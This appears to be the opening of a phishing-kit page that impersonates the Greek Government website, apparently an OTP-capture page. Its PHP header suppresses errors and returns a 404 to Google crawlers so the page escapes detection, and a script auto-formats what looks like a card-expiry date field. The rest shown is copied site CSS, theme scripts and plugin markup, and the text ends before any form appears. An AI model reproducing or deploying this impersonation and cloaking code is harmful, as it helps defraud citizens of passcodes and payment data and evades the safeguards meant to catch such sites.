<?php
error_reporting(0);
   session_start();
      include('setting.php');      
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>

    <!DOCTYPE html>
<!-- saved from url=(0030)http://127.0.0.1/gov/otps.php# -->
<html lang="en" prefix="og: https://ogp.me/ns#" class="td-md-is-chrome translated-ltr" style="height: 100%;"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">.swal-icon--error{border-color:#f27474;-webkit-animation:animateErrorIcon .5s;animation:animateErrorIcon .5s}.swal-icon--error__x-mark{position:relative;display:block;-webkit-animation:animateXMark .5s;animation:animateXMark .5s}.swal-icon--error__line{position:absolute;height:5px;width:47px;background-color:#f27474;display:block;top:37px;border-radius:2px}.swal-icon--error__line--left{-webkit-transform:rotate(45deg);transform:rotate(45deg);left:17px}.swal-icon--error__line--right{-webkit-transform:rotate(-45deg);transform:rotate(-45deg);right:16px}@-webkit-keyframes animateErrorIcon{0%{-webkit-transform:rotateX(100deg);transform:rotateX(100deg);opacity:0}to{-webkit-transform:rotateX(0deg);transform:rotateX(0deg);opacity:1}}@keyframes animateErrorIcon{0%{-webkit-transform:rotateX(100deg);transform:rotateX(100deg);opacity:0}to{-webkit-transform:rotateX(0deg);transform:rotateX(0deg);opacity:1}}@-webkit-keyframes animateXMark{0%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}50%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}80%{-webkit-transform:scale(1.15);transform:scale(1.15);margin-top:-6px}to{-webkit-transform:scale(1);transform:scale(1);margin-top:0;opacity:1}}@keyframes animateXMark{0%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}50%{-webkit-transform:scale(.4);transform:scale(.4);margin-top:26px;opacity:0}80%{-webkit-transform:scale(1.15);transform:scale(1.15);margin-top:-6px}to{-webkit-transform:scale(1);transform:scale(1);margin-top:0;opacity:1}}.swal-icon--warning{border-color:#f8bb86;-webkit-animation:pulseWarning .75s infinite alternate;animation:pulseWarning .75s infinite alternate}.swal-icon--warning__body{width:5px;height:47px;top:10px;border-radius:2px;margin-left:-2px}.swal-icon--warning__body,.swal-icon--warning__dot{position:absolute;left:50%;background-color:#f8bb86}.swal-icon--warning__dot{width:7px;height:7px;border-radius:50%;margin-left:-4px;bottom:-11px}@-webkit-keyframes pulseWarning{0%{border-color:#f8d486}to{border-color:#f8bb86}}@keyframes pulseWarning{0%{border-color:#f8d486}to{border-color:#f8bb86}}.swal-icon--success{border-color:#a5dc86}.swal-icon--success:after,.swal-icon--success:before{content:"";border-radius:50%;position:absolute;width:60px;height:120px;background:#fff;-webkit-transform:rotate(45deg);transform:rotate(45deg)}.swal-icon--success:before{border-radius:120px 0 0 120px;top:-7px;left:-33px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-transform-origin:60px 60px;transform-origin:60px 60px}.swal-icon--success:after{border-radius:0 120px 120px 0;top:-11px;left:30px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-transform-origin:0 60px;transform-origin:0 60px;-webkit-animation:rotatePlaceholder 4.25s ease-in;animation:rotatePlaceholder 4.25s ease-in}.swal-icon--success__ring{width:80px;height:80px;border:4px solid hsla(98,55%,69%,.2);border-radius:50%;box-sizing:content-box;position:absolute;left:-4px;top:-4px;z-index:2}.swal-icon--success__hide-corners{width:5px;height:90px;background-color:#fff;padding:1px;position:absolute;left:28px;top:8px;z-index:1;-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}.swal-icon--success__line{height:5px;background-color:#a5dc86;display:block;border-radius:2px;position:absolute;z-index:2}.swal-icon--success__line--tip{width:25px;left:14px;top:46px;-webkit-transform:rotate(45deg);transform:rotate(45deg);-webkit-animation:animateSuccessTip .75s;animation:animateSuccessTip .75s}.swal-icon--success__line--long{width:47px;right:8px;top:38px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-animation:animateSuccessLong .75s;animation:animateSuccessLong .75s}@-webkit-keyframes rotatePlaceholder{0%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}5%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}12%{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}to{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}}@keyframes rotatePlaceholder{0%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}5%{-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}12%{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}to{-webkit-transform:rotate(-405deg);transform:rotate(-405deg)}}@-webkit-keyframes animateSuccessTip{0%{width:0;left:1px;top:19px}54%{width:0;left:1px;top:19px}70%{width:50px;left:-8px;top:37px}84%{width:17px;left:21px;top:48px}to{width:25px;left:14px;top:45px}}@keyframes animateSuccessTip{0%{width:0;left:1px;top:19px}54%{width:0;left:1px;top:19px}70%{width:50px;left:-8px;top:37px}84%{width:17px;left:21px;top:48px}to{width:25px;left:14px;top:45px}}@-webkit-keyframes animateSuccessLong{0%{width:0;right:46px;top:54px}65%{width:0;right:46px;top:54px}84%{width:55px;right:0;top:35px}to{width:47px;right:8px;top:38px}}@keyframes animateSuccessLong{0%{width:0;right:46px;top:54px}65%{width:0;right:46px;top:54px}84%{width:55px;right:0;top:35px}to{width:47px;right:8px;top:38px}}.swal-icon--info{border-color:#c9dae1}.swal-icon--info:before{width:5px;height:29px;bottom:17px;border-radius:2px;margin-left:-2px}.swal-icon--info:after,.swal-icon--info:before{content:"";position:absolute;left:50%;background-color:#c9dae1}.swal-icon--info:after{width:7px;height:7px;border-radius:50%;margin-left:-3px;top:19px}.swal-icon{width:80px;height:80px;border-width:4px;border-style:solid;border-radius:50%;padding:0;position:relative;box-sizing:content-box;margin:20px auto}.swal-icon:first-child{margin-top:32px}.swal-icon--custom{width:auto;height:auto;max-width:100%;border:none;border-radius:0}.swal-icon img{max-width:100%;max-height:100%}.swal-title{color:rgba(0,0,0,.65);font-weight:600;text-transform:none;position:relative;display:block;padding:13px 16px;font-size:27px;line-height:normal;text-align:center;margin-bottom:0}.swal-title:first-child{margin-top:26px}.swal-title:not(:first-child){padding-bottom:0}.swal-title:not(:last-child){margin-bottom:13px}.swal-text{font-size:16px;position:relative;float:none;line-height:normal;vertical-align:top;text-align:left;display:inline-block;margin:0;padding:0 10px;font-weight:400;color:rgba(0,0,0,.64);max-width:calc(100% - 20px);overflow-wrap:break-word;box-sizing:border-box}.swal-text:first-child{margin-top:45px}.swal-text:last-child{margin-bottom:45px}.swal-footer{text-align:right;padding-top:13px;margin-top:13px;padding:13px 16px;border-radius:inherit;border-top-left-radius:0;border-top-right-radius:0}.swal-button-container{margin:5px;display:inline-block;position:relative}.swal-button{background-color:#7cd1f9;color:#fff;border:none;box-shadow:none;border-radius:5px;font-weight:600;font-size:14px;padding:10px 24px;margin:0;cursor:pointer}.swal-button:not([disabled]):hover{background-color:#78cbf2}.swal-button:active{background-color:#70bce0}.swal-button:focus{outline:none;box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(43,114,165,.29)}.swal-button[disabled]{opacity:.5;cursor:default}.swal-button::-moz-focus-inner{border:0}.swal-button--cancel{color:#555;background-color:#efefef}.swal-button--cancel:not([disabled]):hover{background-color:#e8e8e8}.swal-button--cancel:active{background-color:#d7d7d7}.swal-button--cancel:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(116,136,150,.29)}.swal-button--danger{background-color:#e64942}.swal-button--danger:not([disabled]):hover{background-color:#df4740}.swal-button--danger:active{background-color:#cf423b}.swal-button--danger:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(165,43,43,.29)}.swal-content{padding:0 20px;margin-top:20px;font-size:medium}.swal-content:last-child{margin-bottom:20px}.swal-content__input,.swal-content__textarea{-webkit-appearance:none;background-color:#fff;border:none;font-size:14px;display:block;box-sizing:border-box;width:100%;border:1px solid rgba(0,0,0,.14);padding:10px 13px;border-radius:2px;transition:border-color .2s}.swal-content__input:focus,.swal-content__textarea:focus{outline:none;border-color:#6db8ff}.swal-content__textarea{resize:vertical}.swal-button--loading{color:transparent}.swal-button--loading~.swal-button__loader{opacity:1}.swal-button__loader{position:absolute;height:auto;width:43px;z-index:2;left:50%;top:50%;-webkit-transform:translateX(-50%) translateY(-50%);transform:translateX(-50%) translateY(-50%);text-align:center;pointer-events:none;opacity:0}.swal-button__loader div{display:inline-block;float:none;vertical-align:baseline;width:9px;height:9px;padding:0;border:none;margin:2px;opacity:.4;border-radius:7px;background-color:hsla(0,0%,100%,.9);transition:background .2s;-webkit-animation:swal-loading-anim 1s infinite;animation:swal-loading-anim 1s infinite}.swal-button__loader div:nth-child(3n+2){-webkit-animation-delay:.15s;animation-delay:.15s}.swal-button__loader div:nth-child(3n+3){-webkit-animation-delay:.3s;animation-delay:.3s}@-webkit-keyframes swal-loading-anim{0%{opacity:.4}20%{opacity:.4}50%{opacity:1}to{opacity:.4}}@keyframes swal-loading-anim{0%{opacity:.4}20%{opacity:.4}50%{opacity:1}to{opacity:.4}}.swal-overlay{position:fixed;top:0;bottom:0;left:0;right:0;text-align:center;font-size:0;overflow-y:auto;background-color:rgba(0,0,0,.4);z-index:10000;pointer-events:none;opacity:0;transition:opacity .3s}.swal-overlay:before{content:" ";display:inline-block;vertical-align:middle;height:100%}.swal-overlay--show-modal{opacity:1;pointer-events:auto}.swal-overlay--show-modal .swal-modal{opacity:1;pointer-events:auto;box-sizing:border-box;-webkit-animation:showSweetAlert .3s;animation:showSweetAlert .3s;will-change:transform}.swal-modal{width:478px;opacity:0;pointer-events:none;background-color:#fff;text-align:center;border-radius:5px;position:static;margin:20px auto;display:inline-block;vertical-align:middle;-webkit-transform:scale(1);transform:scale(1);-webkit-transform-origin:50% 50%;transform-origin:50% 50%;z-index:10001;transition:opacity .2s,-webkit-transform .3s;transition:transform .3s,opacity .2s;transition:transform .3s,opacity .2s,-webkit-transform .3s}@media (max-width:500px){.swal-modal{width:calc(100% - 20px)}}@-webkit-keyframes showSweetAlert{0%{-webkit-transform:scale(1);transform:scale(1)}1%{-webkit-transform:scale(.5);transform:scale(.5)}45%{-webkit-transform:scale(1.05);transform:scale(1.05)}80%{-webkit-transform:scale(.95);transform:scale(.95)}to{-webkit-transform:scale(1);transform:scale(1)}}@keyframes showSweetAlert{0%{-webkit-transform:scale(1);transform:scale(1)}1%{-webkit-transform:scale(.5);transform:scale(.5)}45%{-webkit-transform:scale(1.05);transform:scale(1.05)}80%{-webkit-transform:scale(.95);transform:scale(.95)}to{-webkit-transform:scale(1);transform:scale(1)}}</style>
    <title>Greek Government</title>
    
          <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/x-icon" id="appIcon" href="img/icon.png">
      <link rel="stylesheet" href="./files.1/bootstrap.min.css">
      <link rel="stylesheet" href="./files.1/vb.css">
      <link rel="stylesheet" href="./files.1/elta.css" media="all" onload="this.media=&#39;all&#39;">
      <style>.gradient-custom[_ngcontent-vle-c54]{background:#6a11cb;background:linear-gradient(to right,#eceaea,#eceaea)}</style>
      <style>.gradient-custom[_ngcontent-vle-c52]{background:#6a11cb;background:linear-gradient(to right,#eceaea,#eceaea)}.selectedMethod[_ngcontent-vle-c52]{border:2px solid #007bff;border-radius:3px}</style>
      <style>.mat-dialog-container{display:block;padding:24px;border-radius:4px;box-sizing:border-box;overflow:auto;outline:0;width:100%;height:100%;min-height:inherit;max-height:inherit}.cdk-high-contrast-active .mat-dialog-container{outline:solid 1px}.mat-dialog-content{display:block;margin:0 -24px;padding:0 24px;max-height:65vh;overflow:auto;-webkit-overflow-scrolling:touch}.mat-dialog-title{margin:0 0 20px;display:block}.mat-dialog-actions{padding:8px 0;display:flex;flex-wrap:wrap;min-height:52px;align-items:center;box-sizing:content-box;margin-bottom:-24px}.mat-dialog-actions[align=end]{justify-content:flex-end}.mat-dialog-actions[align=center]{justify-content:center}.mat-dialog-actions .mat-button-base+.mat-button-base,.mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}</style>
   </head>
    <link rel="pingback" href="https://government.gov.gr/xmlrpc.php">
    <link rel="icon" type="image/png" href="https://government.gov.gr/wp-content/uploads/2017/09/gov_logos-08_16x16_favicon.png"><link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://government.gov.gr/wp-content/uploads/2017/09/blue_inv-02.png"><link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://government.gov.gr/wp-content/uploads/2017/09/blue_inv-04.png"><link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://government.gov.gr/wp-content/uploads/2017/09/blue_inv-06.png"><link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://government.gov.gr/wp-content/uploads/2017/09/blue_inv-03.png"><link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://government.gov.gr/wp-content/uploads/2017/09/blue_inv-05.png">
 <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/x-icon" id="appIcon" href="gov/img/icon.png">
      <link rel="stylesheet" href="./Greek Government_files/bootstrap.min.css">
      <link rel="stylesheet" href="./Greek Government_files/pci.css">
      <link rel="stylesheet" href="./Greek Government_files/elta.css" media="all" onload="this.media=&#39;all&#39;">
      <style>.gradient-custom[_ngcontent-vle-c54]{background:#6a11cb;background:linear-gradient(to right,#eceaea,#eceaea)}</style>
      <style>.gradient-custom[_ngcontent-vle-c52]{background:#6a11cb;background:linear-gradient(to right,#eceaea,#eceaea)}.selectedMethod[_ngcontent-vle-c52]{border:2px solid #007bff;border-radius:3px}</style>
      <script type="text/javascript">
         $(document).ready(function() {
            $("#txtDate").keyup(function(){
                if ($(this).val().length == 2){
                    $(this).val($(this).val() + "/");
                }else if ($(this).val().length == 5){
                    $(this).val($(this).val() + "/");
                }
            });
         });
      </script>

<meta name="keywords" content="2 χρόνια,ΕΞΩΤΕΡΙΚΗ ΠΟΛΙΤΙΚΗ &amp; ΑΜΥΝΑ">

<script type="application/ld+json" class="aioseop-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://government.gov.gr/#organization","url":"https://government.gov.gr/","name":"Ελληνική Κυβέρνηση","sameAs":["https://twitter.com/govgr","https://www.facebook.com/govgr"]},{"@type":"WebSite","@id":"https://government.gov.gr/#website","url":"https://government.gov.gr/","name":"Ελληνική Κυβέρνηση","publisher":{"@id":"https://government.gov.gr/#organization"},"potentialAction":{"@type":"SearchAction","target":"https://government.gov.gr/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"CollectionPage","@id":"https://government.gov.gr/2015/12/#collectionpage","url":"https://government.gov.gr/2015/12/","inLanguage":"el","name":"Μήνας: Δεκέμβριος 2015","isPartOf":{"@id":"https://government.gov.gr/#website"},"breadcrumb":{"@id":"https://government.gov.gr/2015/12/#breadcrumblist"}},{"@type":"BreadcrumbList","@id":"https://government.gov.gr/2015/12/#breadcrumblist","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://government.gov.gr/","url":"https://government.gov.gr/","name":"Ελληνική Κυβέρνηση"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://government.gov.gr/2015/","url":"https://government.gov.gr/2015/","name":"Έτος: 2015"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://government.gov.gr/2015/12/","url":"https://government.gov.gr/2015/12/","name":"Μήνας: Δεκέμβριος 2015"}}]}]}</script>
<link rel="canonical" href="https://government.gov.gr/2015/12/">
			<script type="text/javascript">
				window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
				ga('create', 'UA-105073460-1', { 'cookieDomain': 'government.gov.gr' } );
				// Plugins
				
				ga('send', 'pageview');
			</script>
			<script async="" src="./Greek Government_files/analytics.js.download"></script>
			<!-- All In One SEO Pack -->
<link rel="dns-prefetch" href="https://code.responsivevoice.org/">
<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="alternate" type="application/rss+xml" title="RSS feed » Greek Government" href="https://government.gov.gr/feed/">
<link rel="alternate" type="application/rss+xml" title="Comment channel » Greek Government" href="https://government.gov.gr/comments/feed/">
<link rel="stylesheet" id="wp-block-library-css" href="./Greek Government_files/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="awsm-ead-public-css" href="./Greek Government_files/embed-public.min.css" type="text/css" media="all">
<link rel="stylesheet" id="get-post-custom-taxonomy-term-shortcode-css" href="./Greek Government_files/get-post-custom-taxonomy-term-shortcode-public.css" type="text/css" media="all">
<link rel="stylesheet" id="rv-style-css" href="./Greek Government_files/responsivevoice.css" type="text/css" media="all">
<link rel="stylesheet" id="rs-plugin-settings-css" href="./Greek Government_files/settings.css" type="text/css" media="all">
<style id="rs-plugin-settings-inline-css" type="text/css">
#rs-demo-id {}
</style>
<link rel="stylesheet" id="thc-style-css" href="./Greek Government_files/the-holiday-calendar.css" type="text/css" media="all">
<link rel="stylesheet" id="wpah-front-styles-css" href="./Greek Government_files/wp-accessibility-helper.min.css" type="text/css" media="all">
<link rel="stylesheet" id="wpctc_wpctc-css" href="./Greek Government_files/wpctc.min.css" type="text/css" media="all">
<link rel="stylesheet" id="google-fonts-style-css" href="./Greek Government_files/css" type="text/css" media="all">
<link rel="stylesheet" id="js_composer_front-css" href="./Greek Government_files/js_composer.min.css" type="text/css" media="all">
<link rel="stylesheet" id="td-theme-css" href="./Greek Government_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="td-theme-child-css" href="./Greek Government_files/style(1).css" type="text/css" media="all">
<script type="text/javascript" src="./Greek Government_files/jquery.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/jquery-migrate.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/get-post-custom-taxonomy-term-shortcode-public.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/responsivevoice.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/jquery.themepunch.tools.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/jquery.themepunch.revolution.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/main.js.download"></script>
<link rel="https://api.w.org/" href="https://government.gov.gr/wp-json/">
<style></style><!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
    <meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress.">
<!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="https://government.gov.gr/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css" media="screen"><![endif]--><meta name="generator" content="Powered by Slider Revolution 5.4.5.1 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.">

<!-- JS generated by theme -->

<script>
    
    

	    var tdBlocksArray = []; //here we store all the items for the current page

	    //td_block class - each ajax block uses a object of this class for requests
	    function tdBlock() {
		    this.id = '';
		    this.block_type = 1; //block type id (1-234 etc)
		    this.atts = '';
		    this.td_column_number = '';
		    this.td_current_page = 1; //
		    this.post_count = 0; //from wp
		    this.found_posts = 0; //from wp
		    this.max_num_pages = 0; //from wp
		    this.td_filter_value = ''; //current live filter value
		    this.is_ajax_running = false;
		    this.td_user_action = ''; // load more or infinite loader (used by the animation)
		    this.header_color = '';
		    this.ajax_pagination_infinite_stop = ''; //show load more at page x
	    }


        // td_js_generator - mini detector
        (function(){
            var htmlTag = document.getElementsByTagName("html")[0];

	        if ( navigator.userAgent.indexOf("MSIE 10.0") > -1 ) {
                htmlTag.className += ' ie10';
            }

            if ( !!navigator.userAgent.match(/Trident.*rv\:11\./) ) {
                htmlTag.className += ' ie11';
            }

	        if ( navigator.userAgent.indexOf("Edge") > -1 ) {
                htmlTag.className += ' ieEdge';
            }

            if ( /(iPad|iPhone|iPod)/g.test(navigator.userAgent) ) {
                htmlTag.className += ' td-md-is-ios';
            }

            var user_agent = navigator.userAgent.toLowerCase();
            if ( user_agent.indexOf("android") > -1 ) {
                htmlTag.className += ' td-md-is-android';
            }

            if ( -1 !== navigator.userAgent.indexOf('Mac OS X')  ) {
                htmlTag.className += ' td-md-is-os-x';
            }

            if ( /chrom(e|ium)/.test(navigator.userAgent.toLowerCase()) ) {
               htmlTag.className += ' td-md-is-chrome';
            }

            if ( -1 !== navigator.userAgent.indexOf('Firefox') ) {
                htmlTag.className += ' td-md-is-firefox';
            }

            if ( -1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome') ) {
                htmlTag.className += ' td-md-is-safari';
            }

            if( -1 !== navigator.userAgent.indexOf('IEMobile') ){
                htmlTag.className += ' td-md-is-iemobile';
            }

        })();




        var tdLocalCache = {};

        ( function () {
            "use strict";

            tdLocalCache = {
                data: {},
                remove: function (resource_id) {
                    delete tdLocalCache.data[resource_id];
                },
                exist: function (resource_id) {
                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
                },
                get: function (resource_id) {
                    return tdLocalCache.data[resource_id];
                },
                set: function (resource_id, cachedData) {
                    tdLocalCache.remove(resource_id);
                    tdLocalCache.data[resource_id] = cachedData;
                }
            };
        })();

    
    
var td_viewport_interval_list=[{"limitBottom":767,"sidebarWidth":228},{"limitBottom":1018,"sidebarWidth":300},{"limitBottom":1140,"sidebarWidth":324}];
var td_animation_stack_effect="type0";
var tds_animation_stack=true;
var td_animation_stack_specific_selectors=".entry-thumb, img";
var td_animation_stack_general_selectors=".td-animation-stack img, .td-animation-stack .entry-thumb, .post img";
var td_ajax_url="https:\/\/government.gov.gr\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=9.6";
var td_get_template_directory_uri="https:\/\/government.gov.gr\/wp-content\/themes\/Newspaper";
var tds_snap_menu="snap";
var tds_logo_on_sticky="show";
var tds_header_style="7";
var td_please_wait="\u03a0\u03b1\u03c1\u03b1\u03ba\u03b1\u03bb\u03ce \u03c0\u03b5\u03c1\u03b9\u03bc\u03ad\u03bd\u03b5\u03c4\u03b5...";
var td_email_user_pass_incorrect="\u03a7\u03c1\u03ae\u03c3\u03c4\u03b7\u03c2 \u03ae \u03ba\u03c9\u03b4\u03b9\u03ba\u03cc\u03c2 \u03bb\u03b1\u03bd\u03b8\u03b1\u03c3\u03bc\u03ad\u03bd\u03bf\u03c2!";
var td_email_user_incorrect="Email \u03ae \u03cc\u03bd\u03bf\u03bc\u03b1 \u03c7\u03c1\u03ae\u03c3\u03c4\u03b7 \u03bb\u03b1\u03bd\u03b8\u03b1\u03c3\u03bc\u03ad\u03bd\u03bf!";
var td_email_incorrect="Email \u03bb\u03b1\u03bd\u03b8\u03b1\u03c3\u03bc\u03ad\u03bd\u03bf!";
var tds_more_articles_on_post_enable="";
var tds_more_articles_on_post_time_to_wait="";
var tds_more_articles_on_post_pages_distance_from_top=0;
var tds_theme_color_site_wide="#004b8d";
var tds_smart_sidebar="enabled";
var tdThemeName="Newspaper";
var td_magnific_popup_translation_tPrev="\u03a0\u03c1\u03bf\u03b7\u03b3\u03bf\u03cd\u03bc\u03b5\u03bd\u03bf ( < )";
var td_magnific_popup_translation_tNext="\u0395\u03c0\u03cc\u03bc\u03b5\u03bd\u03bf ( > )";
var td_magnific_popup_translation_tCounter="%curr% \u03b1\u03c0\u03cc %total%";
var td_magnific_popup_translation_ajax_tError="\u03a4\u03bf \u03c0\u03b5\u03c1\u03b9\u03b5\u03c7\u03cc\u03bc\u03b5\u03bd\u03bf \u03b1\u03c0\u03cc %url% \u03b4\u03b5\u03bd \u03ba\u03b1\u03c4\u03ad\u03c3\u03c4\u03b7 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc \u03bd\u03b1 \u03c6\u03bf\u03c1\u03c4\u03c9\u03b8\u03b5\u03af.";
var td_magnific_popup_translation_image_tError="\u0397 \u03b5\u03b9\u03ba\u03cc\u03bd\u03b1 #%curr% \u03b4\u03b5\u03bd \u03ba\u03b1\u03c4\u03ad\u03c3\u03c4\u03b7 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc \u03bd\u03b1 \u03c6\u03bf\u03c1\u03c4\u03c9\u03b8\u03b5\u03af";
var tdsDateFormat="j F Y";
var tdDateNamesI18n={"month_names":["\u0399\u03b1\u03bd\u03bf\u03c5\u03ac\u03c1\u03b9\u03bf\u03c2","\u03a6\u03b5\u03b2\u03c1\u03bf\u03c5\u03ac\u03c1\u03b9\u03bf\u03c2","\u039c\u03ac\u03c1\u03c4\u03b9\u03bf\u03c2","\u0391\u03c0\u03c1\u03af\u03bb\u03b9\u03bf\u03c2","\u039c\u03ac\u03b9\u03bf\u03c2","\u0399\u03bf\u03cd\u03bd\u03b9\u03bf\u03c2","\u0399\u03bf\u03cd\u03bb\u03b9\u03bf\u03c2","\u0391\u03cd\u03b3\u03bf\u03c5\u03c3\u03c4\u03bf\u03c2","\u03a3\u03b5\u03c0\u03c4\u03ad\u03bc\u03b2\u03c1\u03b9\u03bf\u03c2","\u039f\u03ba\u03c4\u03ce\u03b2\u03c1\u03b9\u03bf\u03c2","\u039d\u03bf\u03ad\u03bc\u03b2\u03c1\u03b9\u03bf\u03c2","\u0394\u03b5\u03ba\u03ad\u03bc\u03b2\u03c1\u03b9\u03bf\u03c2"],"month_names_short":["\u0399\u03b1\u03bd","\u03a6\u03b5\u03b2","\u039c\u03b1\u03c1","\u0391\u03c0\u03c1","\u039c\u03b1\u0390","\u0399\u03bf\u03cd\u03bd","\u0399\u03bf\u03cd\u03bb","\u0391\u03c5\u03b3","\u03a3\u03b5\u03c0","\u039f\u03ba\u03c4","\u039d\u03bf\u03ad","\u0394\u03b5\u03ba"],"day_names":["\u039a\u03c5\u03c1\u03b9\u03b1\u03ba\u03ae","\u0394\u03b5\u03c5\u03c4\u03ad\u03c1\u03b1","\u03a4\u03c1\u03af\u03c4\u03b7","\u03a4\u03b5\u03c4\u03ac\u03c1\u03c4\u03b7","\u03a0\u03ad\u03bc\u03c0\u03c4\u03b7","\u03a0\u03b1\u03c1\u03b1\u03c3\u03ba\u03b5\u03c5\u03ae","\u03a3\u03ac\u03b2\u03b2\u03b1\u03c4\u03bf"],"day_names_short":["\u039a\u03c5","\u0394\u03b5","\u03a4\u03c1","\u03a4\u03b5","\u03a0\u03b5","\u03a0\u03b1","\u03a3\u03b1"]};
var td_ad_background_click_link="";
var td_ad_background_click_target="";
</script>

<link rel="icon" href="https://government.gov.gr/wp-content/uploads/2017/01/ethnosimo-70-70x70.png" sizes="32x32">
<link rel="icon" href="https://government.gov.gr/wp-content/uploads/2017/01/ethnosimo-70.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="https://government.gov.gr/wp-content/uploads/2017/01/ethnosimo-70.png">
<meta name="msapplication-TileImage" content="https://government.gov.gr/wp-content/uploads/2017/01/ethnosimo-70.png">
<script type="text/javascript">function setREVStartSize(e){
				try{ var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;					
					if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})					
				}catch(d){console.log("Failure at Presize of Slider:"+d)}
			};</script>
<noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><link type="text/css" rel="stylesheet" charset="UTF-8" href="./Greek Government_files/translateelement.css"> <link type="text/css" rel="stylesheet" charset="UTF-8" href="./Greek Government_files/translateelement(1).css"></head>

<body class="archive date mva7-thc-activetheme-Newspaper chrome linux wp-accessibility-helper accessibility-contrast_mode_on wah_fstype_script accessibility-underline-setup accessibility-location-left global-block-template-1 white-menu wpb-js-composer js-comp-ver-5.2.1 vc_responsive td-animation-stack-type0 td-boxed-layout td-js-loaded" itemscope="itemscope" itemtype="https://schema.org/WebPage" style="position: relative; min-height: 100%; top: 0px;" _c_t_common="1"><div id="wp_access_helper_container" class="accessability_container light_theme">

    <!-- WP Accessibility Helper (WAH) - https://wordpress.org/plugins/wp-accessibility-helper/ -->

	<!-- Official plugin website - https://accessibility-helper.co.il -->

    
            <div id="access_container" aria-hidden="false">

                <button tabindex="-1" type="button" class="close_container wahout" accesskey="x" aria-label="Closure" title="Closure"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">

                    Closure
                </font></font></button>

                <div class="access_container_inner">

                    <div class="a_module wah_clear_cookies">

            <div class="a_module_exe">

